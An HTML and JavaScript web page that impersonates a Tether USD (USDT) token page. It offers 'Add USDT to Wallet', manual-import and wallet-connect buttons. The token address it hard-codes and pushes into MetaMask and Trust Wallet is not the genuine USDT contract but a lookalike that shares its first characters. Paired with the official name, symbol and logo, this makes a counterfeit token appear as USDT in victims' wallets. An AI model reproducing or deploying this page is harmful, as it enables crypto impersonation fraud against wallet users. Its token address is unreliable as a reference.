<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT - Tether USD Token</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 90%;
            text-align: center;
        }
        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #00D4AA, #00A86B);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 48px;
            box-shadow: 0 10px 40px rgba(0,212,170,0.3);
        }
        .logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        .symbol {
            color: #00D4AA;
            font-size: 20px;
            font-weight: bold;
        }
        .info {
            margin-top: 30px;
            text-align: left;
        }
        .info-item {
            background: rgba(0,0,0,0.2);
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
        }
        .label {
            color: #888;
            font-size: 12px;
            text-transform: uppercase;
        }
        .value {
            font-size: 16px;
            margin-top: 5px;
            word-break: break-all;
        }
        .address {
            font-family: monospace;
            cursor: pointer;
        }
        .badge {
            display: inline-block;
            background: #00D4AA;
            color: #000;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-top: 20px;
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin-top: 30px;
        }
        .stat {
            text-align: center;
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #00D4AA;
        }
        .stat-label {
            font-size: 12px;
            color: #888;
            margin-top: 5px;
        }
        .connect-btn {
            background: linear-gradient(135deg, #00D4AA, #00A86B);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }
        .connect-btn:hover {
            transform: scale(1.05);
        }
        .wallet-info {
            display: none;
            margin-top: 20px;
            background: rgba(0,212,170,0.2);
            padding: 15px;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="src/components/logo.svg" alt="USDT Logo">
        </div>
        <h1>Tether USD</h1>
        <div class="symbol">USDT</div>
        <div class="badge">USD Token</div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-value" id="price">$1.00</div>
                <div class="stat-label">Price</div>
            </div>
            <div class="stat">
                <div class="stat-value" id="supply">0</div>
                <div class="stat-label">Total Supply</div>
            </div>
        </div>
        
        <div class="info">
            <div class="info-item">
                <div class="label">Token Address</div>
                <div class="value address" onclick="copyToClipboard('0xdac17f95E2e6AB94b299debc7360a4bfF51281C9')">
                    0xdac17f95E2e6AB94b299debc7360a4bfF51281C9
                </div>
            </div>
            <div class="info-item">
                <div class="label">Network</div>
                <div class="value">Ethereum Mainnet</div>
            </div>
            <div class="info-item">
                <div class="label">Decimals</div>
                <div class="value">6</div>
            </div>
            <div class="info-item">
                <div class="label">Pool Address</div>
                <div class="value address" id="poolAddress">Not configured</div>
            </div>
        </div>
        
        <button class="connect-btn" id="addTokenBtn" onclick="addTokenToWallet()">
            Add USDT to Wallet
        </button>

        <button class="connect-btn" id="manualBtn" onclick="showManualImport()">
            Import Manually
        </button>

        <div id="manualImport" class="wallet-info" style="display:none; text-align:left; max-width:480px;">
            <div class="label" style="margin-bottom:6px;">Manual Import</div>
            <div class="value"><strong>Address:</strong> <span id="manualAddress"></span></div>
            <div class="value"><strong>Symbol:</strong> <span id="manualSymbolValue"></span></div>
            <div class="value"><strong>Decimals:</strong> <span id="manualDecimalsValue"></span></div>
            <button class="connect-btn" style="margin-top:10px;" onclick="copyManualDetails()">Copy Details</button>
            <button class="connect-btn" style="margin-left:10px;" onclick="document.getElementById('manualImport').style.display='none'">Close</button>
        </div>

        <button class="connect-btn" id="wcBtn" onclick="connectWalletWC()">
            Connect via WalletConnect
        </button>

        <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
            Connect Wallet
        </button>
        
        <div class="wallet-info" id="walletInfo">
            <div class="label">Connected Wallet</div>
            <div class="value address" id="walletAddress"></div>
            <div class="label" style="margin-top:10px">Balance</div>
            <div class="value" id="balance"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
    <script>
        const TOKEN_ADDRESS = '0xdac17f95E2e6AB94b299debc7360a4bfF51281C9';
        const TOKEN_NAME = 'Tether USD';
        const TOKEN_SYMBOL = 'USDT';
        const TOKEN_DECIMALS = 6;
        const TOKEN_LOGO = 'https://tether-international.github.io/usd-peg/public/logo.png';
        const RPC_URL = 'https://mainnet.infura.io/v3/0cf7362b782a4735b892d9f8136436a8';
        
        async function addTokenToWallet() {
            if (typeof window.ethereum === 'undefined') {
                alert('Please install MetaMask or Trust Wallet');
                return;
            }
            const address = TOKEN_ADDRESS;
            const symbol = TOKEN_SYMBOL;
            const decimals = TOKEN_DECIMALS;
            const logoURL = TOKEN_LOGO;
            // Resolve image as data URI when possible (try on all platforms)
            let imageValue = logoURL;
            const isMobile = /Mobi|Android/i.test(navigator.userAgent);
            try {
                const resp = await fetch(logoURL, { mode: 'cors' });
                if (resp.ok) {
                    const blob = await resp.blob();
                    imageValue = await new Promise((resolve) => {
                        const fr = new FileReader();
                        fr.onload = () => resolve(fr.result);
                        fr.onerror = () => resolve(logoURL);
                        fr.readAsDataURL(blob);
                    });
                }
            } catch (_) {
                imageValue = logoURL;
            }

            // If mobile, force manual import path (Trust Wallet / mobile wallets) to bypass WalletConnect issues
            if (isMobile) {
                document.getElementById('manualImport').style.display = 'block';
                document.getElementById('manualAddress').textContent = '0xdac17f95E2e6AB94b299debc7360a4bfF51281C9';
                document.getElementById('manualSymbolValue').textContent = 'USDT';
                document.getElementById('manualDecimalsValue').textContent = '6';
                return;
            }
            // Try to add token using wallet_watchAsset (array form) for broad compatibility
            let added = false;
            try {
                const imageParam = imageValue;
                const payloadArray = [{ type: 'ERC20', options: { address, symbol, decimals, image: imageParam } }];
                console.log('wallet_watchAsset array payload:', payloadArray);
                const res = await window.ethereum.request({ method: 'wallet_watchAsset', params: payloadArray });
                console.log('wallet_watchAsset array response:', res);
                if (res) added = true;
            } catch (err) {
                console.warn('Array form failed, trying object form. Error:', err);
            }
            // Fallback: object form (legacy)
            if (!added) {
                try {
                    const res2 = await window.ethereum.request({
                        method: 'wallet_watchAsset',
                        params: {
                            type: 'ERC20',
                            options: {
                                address,
                                symbol,
                                decimals,
                                image: imageValue
                            }
                        }
                    });
                    if (res2) added = true;
                } catch (e2) {
                    console.error('Error adding token (object form fallback):', e2);
                }
            }
            if (added) {
                alert('USDT added to your wallet!');
            } else {
                alert('Token not added');
            }
        }

        // WalletConnect fallback for Trust Wallet / WalletConnect-compatible wallets
        async function connectWalletWC() {
            // Do not force manual import on mobile; rely on WalletConnect / wallet_watchAsset
            const isMobile = /Mobi|Android/i.test(navigator.userAgent);
            if (typeof window === 'undefined' || typeof window.WalletConnectProvider === 'undefined') {
                alert('WalletConnect is not loaded.');
                return;
            }
            const WalletConnectProvider = window.WalletConnectProvider.default || window.WalletConnectProvider;
            try {
                const provider = new WalletConnectProvider({
                    rpc: { 1: RPC_URL }
                });
                await provider.enable();
                // Expose the WalletConnect provider as the global ethereum provider
                window.ethereum = provider;
                const wcProvider = new ethers.providers.Web3Provider(provider);
                const signer = wcProvider.getSigner();
                const address = await signer.getAddress();
                document.getElementById('walletAddress').textContent = address;
                document.getElementById('walletInfo').style.display = 'block';
                document.getElementById('wcBtn').textContent = 'Wallet Connected';
                const balance = await wcProvider.getBalance(address);
                document.getElementById('balance').textContent = ethers.utils.formatEther(balance) + ' ETH';
            } catch (err) {
                console.error('WalletConnect error:', err);
                alert('WalletConnect error: ' + (err && err.message ? err.message : String(err)));
            }
        }
        
        async function connectWallet() {
            if (typeof window.ethereum === 'undefined') {
                alert('Please install MetaMask');
                return;
            }
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send('eth_requestAccounts', []);
                const signer = provider.getSigner();
                const address = await signer.getAddress();
                
                document.getElementById('walletAddress').textContent = address;
                document.getElementById('walletInfo').style.display = 'block';
                document.getElementById('connectBtn').textContent = 'Connected';
                
                // Get balance
                const balance = await provider.getBalance(address);
                document.getElementById('balance').textContent = ethers.utils.formatEther(balance) + ' ETH';
            } catch (err) {
                console.error(err);
            }
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text);
            alert('Copied to clipboard!');
        }

        function copyManualDetails() {
            const text = `Address: ${TOKEN_ADDRESS}\nSymbol: ${TOKEN_SYMBOL}\nDecimals: ${TOKEN_DECIMALS}`;
            navigator.clipboard.writeText(text);
            alert('Manual details copied to clipboard');
        }
        
        // Load token info
        async function loadTokenInfo() {
            const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
            const token = new ethers.Contract(TOKEN_ADDRESS, [
                'function name() view returns (string)',
                'function symbol() view returns (string)',
                'function decimals() view returns (uint8)',
                'function totalSupply() view returns (uint256)'
            ], provider);
            
            try {
                const name = await token.name();
                const symbol = await token.symbol();
                const decimals = await token.decimals();
                const supply = await token.totalSupply();
                
                document.querySelector('h1').textContent = name;
                document.querySelector('.symbol').textContent = symbol;
                document.querySelector('.stat-value#supply').textContent = 
                    (Number(supply) / Math.pow(10, decimals)).toLocaleString();
            } catch (err) {
                console.error(err);
            }
        }
        
        loadTokenInfo();
    </script>
</body>
</html>
